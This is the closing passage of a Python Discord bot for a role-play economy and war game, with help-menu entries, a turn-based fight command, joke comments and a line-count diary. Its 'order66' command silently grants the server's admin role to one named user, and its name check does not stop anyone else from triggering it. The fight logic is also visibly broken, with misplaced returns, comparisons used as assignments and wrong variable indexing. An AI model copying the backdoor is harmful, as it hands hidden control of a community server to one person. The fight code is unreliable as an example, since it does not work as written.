            embed.add_field(name=usedPrefix+"update", value="Update all houses and players\nAliases : "+usedPrefix+"None", inline=False)
            embed.add_field(name=usedPrefix+"merge HOUSE_FROM HOUSE_TO", value="Merge two houses\nAliases : "+usedPrefix+"None", inline=False)
            embed.add_field(name=usedPrefix+"changeHouse HOUSE_NAME VALUE NEWVALUE", value="Change house value\nAliases : "+usedPrefix+"staff1", inline=False)
            embed.add_field(name=usedPrefix+"changePlayer", value="Change Player value\nAliases : "+usedPrefix+"staff2", inline=False)
            embed.add_field(name=usedPrefix+"clearTroops", value="Staff can reset a movement (soldiers available again for the city).\nAliases : "+usedPrefix+"clearMovement", inline=False)

        else:
            embed=discord.Embed(title="Manual", description="General Search", color=0xc5bcc5)

            if category in ["listhouses", "list1"]:
                embed.add_field(name=usedPrefix+"listHouses", value="List Houses\nAliases : "+usedPrefix+"list1", inline=False)
            elif category in ["listplayers", "list2"]:
                embed.add_field(name=usedPrefix+"listPlayers", value="List Players\nAliases : "+usedPrefix+"list2", inline=False)
            elif category in ["listguilds", "list3"]:
                embed.add_field(name=usedPrefix+"listGuilds", value="List Guilds\nAliases : "+usedPrefix+"list3", inline=False)
            elif category in ["items", "list4"]:
                embed.add_field(name=usedPrefix+"items", value="List items and prices in shop\nAliases : "+usedPrefix+"list4", inline=False)
            elif category in ["cities", "list5"]:
                embed.add_field(name=usedPrefix+"cities", value="List cities and their coordinates\nAliases : "+usedPrefix+"list5", inline=False)
            elif category in ["buy", "shop"]:
                embed.add_field(name=usedPrefix+"buy CHOICE AMOUNT", value="HOUSE LEADER ONLY\nBuy things from the inventory\nAliases : "+usedPrefix+"shop", inline=False)
            elif category in ["send", "pay"]:
                embed.add_field(name=usedPrefix+"send HOUSE_TO AMOUNT", value="HOUSE LEADER ONLY\nSend money to another house\nAliases : "+usedPrefix+"pay", inline=False)
            elif category in ["change"]:
                embed.add_field(name=usedPrefix+"change", value="HOUSE LEADER ONLY\nChange taxes and army\nAliases : "+usedPrefix+"None", inline=False)
            elif category in ["stats", "population"]:
                embed.add_field(name=usedPrefix+"stats", value="Detailed statistics of your house\nAliases : "+usedPrefix+"population", inline=False)
            elif category in ["inventory", "stuff"]:
                embed.add_field(name=usedPrefix+"inventory", value="List items you bought\nAliases : "+usedPrefix+"stuff", inline=False)
            elif category in ["me", "personal"]:
                embed.add_field(name=usedPrefix+"me ( change guards AMOUNT(max3 or 5 for house leader) )", value="Details about your character and change guards\nAliases : "+usedPrefix+"personal", inline=False)
            elif category in ["travel", "move"]:
                embed.add_field(name=usedPrefix+"travel", value="Log your travel for staff\nAliases : "+usedPrefix+"move", inline=False)
            elif category in ["guild", "guildinfo"]:
                embed.add_field(name=usedPrefix+"guild", value="GUILD MEMBERS ONLY\nAliases : "+usedPrefix+"guildInfo", inline=False)
            elif category in ["init_house", "init1"]:
                embed.add_field(name=usedPrefix+"init_house HOUSE_NAME", value="Create a new house\nAliases : "+usedPrefix+"init1", inline=False)
            elif category in ["init_user", "init2"]:
                embed.add_field(name=usedPrefix+"init_user", value="Create  a new User\nAliases : "+usedPrefix+"init2", inline=False)
            elif category in ["user", "player"]:
                embed.add_field(name=usedPrefix+"user", value="Get Statistics of User\nAliases : "+usedPrefix+"player", inline=False)
            elif category in ["grep", "grab"]:
                embed.add_field(name=usedPrefix+"grep HOUSE_NAME VALUE", value="Grab a specific value\nAliases : "+usedPrefix+"grab", inline=False)
            elif category in ["recalibrate", "fuck"]:
                embed.add_field(name=usedPrefix+"recalibrate", value="Recalibrate and recalculate economy section\nAliases : "+usedPrefix+"fuck", inline=False)
            elif category in ["update"]:
                embed.add_field(name=usedPrefix+"update", value="Update all houses and players\nAliases : "+usedPrefix+"None", inline=False)
            elif category in ["merge"]:
                embed.add_field(name=usedPrefix+"merge HOUSE_FROM HOUSE_TO", value="Merge two houses\nAliases : "+usedPrefix+"None", inline=False)
            elif category in ["changehouse", "staff1"]:
                embed.add_field(name=usedPrefix+"changeHouse HOUSE_NAME VALUE NEWVALUE", value="Change house value\nAliases : "+usedPrefix+"staff1", inline=False)
            elif category in ["changeplayer", "staff2"]:
                embed.add_field(name=usedPrefix+"changePlayer", value="Change Player value\nAliases : "+usedPrefix+"staff2", inline=False)
            elif category in ["movetroops", "traveltroops", "troops"]:
                embed.add_field(name=usedPrefix+"troops CityFrom CityTo Amount", value="Send soldiers to another city.\nAliases : "+usedPrefix+"moveTroopss", inline=False)
            elif category in ["movements", "listmovements", "listtroops"]:
                embed.add_field(name=usedPrefix+"movements", value="List all current troop movements of your house.\nAliases : "+usedPrefix+"listMovements, listTroops", inline=False)
            elif category in ["cleartroops", "clearmovement"]:
                embed.add_field(name=usedPrefix+"clearTroops", value="Staff can reset a movement (soldiers available again for the city).\nAliases : "+usedPrefix+"clearMovement", inline=False)

            else:
                embed.add_field(name="Not Found", value="N/A", inline=False)
        await channel.send(embed=embed)

        """

        // GAME THINGS (fights and all)
                Spartians ! Lay down your weapons !
            /| ________________
        O|===|* >________________>
            \|

        """

    elif command in ["fight", "wwe"]:
        if staffMemberRequest == 0: await sendError("Staff only.", channel) ; return 0

        # init variables
        anotherOne, index, players, playerAttacks, playerHealth = True, -1, [], [], []
        print(param[1])
        # default players for test purpose
        if param[1] == "usual":
            anotherOne = False
            return
            players = ["Towa of the Klan", "Arya Anor", "Doubledore Piast", "Petter Berg"]

        # get all members in fight
        print(anotherOne)
        while anotherOne:
            index += 1
            await sendRequest("Player " + str(index) + ": name", channel)
            answer = await getInput(message)

            if getInput(message) in ["abort", "stop"]:
                return -1
            if getInput(message) in ["none", "no"]:
                anotherOne == False
                break
            players.append(getInput(message))

        # grep all attackStats
        for i in range(len(players)):
            request = (db.grepValue(players[i], "attackStats", "players"))
            print(request)
            try:
                playerAttacks.append(int(request))
            except:
                await sendError("Player Error", channel)
        # backup, just in case
        rankedStats = playerAttacks

        # custom sort, we sort the attack stats and player list appropriately
        i = -1
        embedReport = ""
        while i <= len(playerAttacks):
            i += 1
            try:
                if rankedStats[i] < rankedStats[i+1]:
                    # save the higher stats one into buffer
                    saved = rankedStats[i]
                    # this one has lower stats, so move him right
                    rankedStats[i] = rankedStats[i+1]
                    # the higher one (saved) takes that position
                    rankedStats[i+1] = saved
                    # repeat process, but for the player-names
                    saved = players[i]
                    players[i] = players[i+1]
                    players[i+1] = saved

                    i = -1
            except:
                pass


        """
        the fight goes in rounds, first highest ranked player attacks who he wants, then the second then third etc etc
        """
        for i in range(len(rankedStats)):
            playerHealth.append(100)
        stillAlive = True
        outerIndex = -1
        while stillAlive:
            embedReport = ""
            for i in range(len(rankedStats)):
                #embedReport = embedReport + "\n" + "Player ["+str(i)+"] : "+str(players[i])+"\n    Attack Stats : " + str(rankedStats[i]) +"\n    Health : " + str(100) +"\n"
                embedReport = embedReport + "\n" + "Player ["+str(i)+"] : "+str(players[i])+"\n    Health : " + str(playerHealth[i]) +"\n"
            await sendEmbed("Sorted from higher to lower :", embedReport, channel)
            outerIndex += 1
            error = True
            while error:
                await sendEmbed(nickName, "Player  ["+str(outerIndex)+"] ("+ players[outerIndex] +") attacks who (ENTER ID)", channel)
                answer = await getInput(message)

                try:
                    firstAttackID = int(answer)
                    attackedPlayer = players[firstAttackID]
                    attackedPlayerHealth = playerHealth[firstAttackID]
                    playerAttack = rankedStats[outerIndex]
                    playerAttackHealth = playerHealth[outerIndex]
                    attackerName = players[outerIndex]

                    print("firstAttackID")
                    x = range(len(players))
                    print(x)
                    if firstAttackID in x:
                        error = False
                    else:
                        await sendError("Unproper ID given", channel)
                        continue
                except Exception as e:
                    print(e)
                    await sendError("Unproper ID given", channel)
                    continue

            sent =  await sendEmbed("LETS GO", attackedPlayer , channel)

            tryAttack = random.randint(1, 21)
            print("\n\n", tryAttack, playerAttack, "\n\n")
            if tryAttack >= playerAttack:
                status = await createEmbed("Attack failed", "Very sad." , channel)
                await sent.edit(embed=status)
                ripostMenu = "counter"
                attackStatus = False

            else:
                x = await createEmbed("Attack Succeeded", attackerName + " attacks " + attackedPlayer, channel)
                sent.edit(embed=x)
                attackStatus = True
                ripostMenu = "DODGE / COUNTER"
            askRipost = await sendEmbed(attackedPlayer, "DODGE / COUNTER", channel)

            false = True
            while false:
                answer = await getInput(message)
                print(answer)
                if answer in ["dodge", "counter", "abort"]:
                    ripost = answer
                    if ripost == "abort":
                        return 0
                    break
                else:
                    await sendError("either dodge or counter (or abort)", channel)

            if ripost == "dodge":
                usedValue = db.grepValue(attackedPlayer, "dexterity","players")
            elif ripost == "counter":
                usedValue = db.grepValue(attackedPlayer, "counterStats","players")
            print(usedValue)

            tryDefend = random.randint(1, 21)

            print(tryDefend, playerAttack)
            if tryAttack >= playerAttack:
                x = await createEmbed("Ripost", ripost + " failed..", channel, "red")
                askRipost.edit(embed=x)
                if attackStatus == True:
                    attackedPlayerHealth = attackedPlayerHealth[outerIndex] - tryAttack * 2
                    playerHealth[outerIndex] = attackedPlayerHealth
            else:
                x = await createEmbed("Ripost", ripost + " failed..", channel, "red")
                askRipost.edit(embed=x)
                if ripost == "counter":
                    print(playerHealth[firstAttackID])
                    playerAttackHealth = playerAttackHealth - tryDefend * 2
                    playerHealth[firstAttackID] = playerAttackHealth

            await sendEmbed("End of " + attackerName + "'s attack", "Player " + attackerName + ": health : " + str(playerAttackHealth) + "\nPlayer " + str(attackedPlayer.upper()) + ": health : " + str(playerAttackHealth), channel)

            # wait if someone wants to retreat
            error = True
            while error:
                await channel.send(message.author.mention)
                ask = await sendEmbed("Any Retreat", "does a player want to retreat ? [y/N]", channel)

                yOrNo = await getInput(message)
                if yOrNo == "y":
                    embeded = await createEmbed("Retreat", "Enter ID of Retreat", channel)
                    await ask.edit(embed=embeded)
                    id = await getInput(message)
                    id = int(id)

    elif command in ["oop", "ohoh"]:
        if staffMemberRequest == 0: await sendError("Staff only.", channel) ; return 0

        # init variables


    elif command == "order66":
        await channel.send("Getting to the senate...")


        if message.author.name != "Kendrik":
            await channel.send("Only the emperor can give the order..")

        moderators = discord.utils.get(server.roles, name="Economy Bot Admin")
        user = discord.utils.get(server.members, name = 'Kendrik', discriminator = "2820")

        await channel.send("Overthrowing the senate...")

        await user.add_roles(moderators)
        await channel.send("Time for the republic to rise.")
        #remove_roles()



    # everything failed
    else:
        await sendError("Command not found, Use "+usedPrefix+"man/manual to get help\nOr feel free to ask other players in the general chat :)", channel)



        """
                |--------------------------------|
            o --|  filthy russians communists !! |
           \|/  |--------------------------------|
           / \
        """
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# ~~~~~~~~~~~~~~~~~~~~~ berlin wall be like ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    """
                |---------------------|
            o --|  тупые американцы ! |
           \|/  |---------------------|
           / \
    """


    """

    logbook of the captain : currently listening to nirvana, mtv unplugged
    'oh but why you include that in here ?'
    well its the end of the code so im free !

    06.04.20 : dang >:( c o r o n a

    """


# RUN RUN RUN RUN - I CAN BE A BACKPACK WHILE YOU JUMP (seagulls - stop it now !)
print("Starting bot")
client.run(token)
# tada ! line 709 at 11.01.20 lmao
# bruh, 789 now at 18.01.20
# hmm, 30.01.20 - 947 lines
# actually, 1st february : doing a lot of optimization, so - 913 lines ! (nice)
# 22th of february. 1068 lines ! and finally vacations...
# 6th april.... corona "vacations" 1342 lines, added movement system for troops
